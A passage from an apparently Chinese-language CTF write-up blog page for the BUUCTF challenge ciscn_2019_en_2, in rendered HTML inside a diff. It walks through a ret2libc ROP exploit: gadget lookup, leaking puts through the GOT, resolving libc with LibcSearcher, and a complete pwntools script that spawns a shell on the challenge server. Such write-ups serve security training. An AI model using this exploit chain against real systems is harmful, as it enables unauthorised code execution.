+</span></span><span class="line"><span class="cl">0x00000000004006b9 : ret
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>也可以通过 pwntools 的内置函数得到：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rop_gadget</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">m_elf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">rop_gadget</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;pop rdi&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">rop_gadget</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;ret&#34;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span></span></code></pre></div><p>puts 的 plt 和 got 地址、main 的地址同理：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_plt</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
+</span></span></code></pre></div><p>然后我们可以构建第一个 payload 了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># offset:int = 0x58，可以由gdb或者ida得知</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span></code></pre></div><p>然后我们就能得到<code>puts</code>的真实地址了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Ciphertext</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里很奇怪，调试后发现多了一个0a，要把它吞掉</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到真实地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>为了避免各种版本的 libc 影响，我们可以使用 LibcSearcher：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 计算得到基址和system地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">searcher</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 手动选择第0号搜索到的libc</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果你选择0号不行，也可以把这行注释掉，运行中再选择</span>
+</span></span><span class="line"><span class="cl"><span class="n">searcher</span><span class="o">.</span><span class="n">select_libc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><blockquote>
+<p>原版 LibcSearcher 已经年久失修，而且基于本地 libc 库，几乎完全不可用，GitHub 上有很多新版 LibcSearcher，我选择了这个<a href="https://github.com/dev2ero/LibcSearcher">使用云端 libc 库的项目</a></p>
+</blockquote>
+<blockquote>
+<p>作者为了使用正确的 libc 甚至重新搭了一个 ubuntu18.04 的虚拟机环境，但是在几个小时的忙碌后发现 libc 版本还是不对，于是转而选择 LibcSearcher，不得不说，是真**的好用，感谢原作者和后续无私奉献的开发者！</p>
+</blockquote>
+<p>然后我们可以构建 payload 了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">payload = b&#34;\0&#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr)
+</span></span></code></pre></div><h3 id="完整-exp">完整 exp</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./ciscn_2019_en_2&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;29058&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span><span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;break main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 两个elf，注意libc的版本</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 查找gadget的内置函数</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">if_32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop_gadget</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">m_elf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">rop_gadget</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;pop rdi&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">rop_gadget</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;ret&#34;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;pop_rdi:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ret:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#需要自行设定offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="mh">0x58</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 需要改为需要的输入函数，默认为puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;puts_plt:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;puts_got:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;main_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your choice!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input your Plaintext to be encrypted</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">if_32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 得到真实地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Ciphertext</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 得到真实地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 计算得到基址和system地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">searcher</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">searcher</span><span class="o">.</span><span class="n">select_libc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">searcher</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;puts_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;base_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;system_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;bin_sh_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your choice!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input your Plaintext to be encrypted</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">if_32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Ciphertext</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/libsearcher/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#LibSearcher</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >上一页</span
+        >
+        <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="block">【HarekazeCTF2019】baby_rop</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/" class="block">【printf不刷新缓冲区】not_the_same_3dsctf_2016</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#write-upbuuctf-ciscn_2019_en_2">【Write-up】BUUCTF ciscn_2019_en_2</a>
+      <ul>
+        <li><a href="#checksec-查看程序架构">checksec 查看程序架构</a></li>
+        <li><a href="#ida-查看程序伪代码">ida 查看程序伪代码</a></li>
+        <li><a href="#构建-exp">构建 exp</a>
+          <ul>
+            <li><a href="#完整-exp">完整 exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">【32位系统传参】BUUCTF picoctf_2018_rop chain</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">【C&#43;&#43;Pwn】[ZJCTF 2019]Login</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">【C内嵌汇编】others_shellcode</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="no-underline">【HarekazeCTF2019】baby_rop</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div>
+<link rel="stylesheet" href="../../css/copy-btn.css">
+<script src="../../js/copy-btn.js"></script></div>
+    </footer>
+  </body>
+</html>
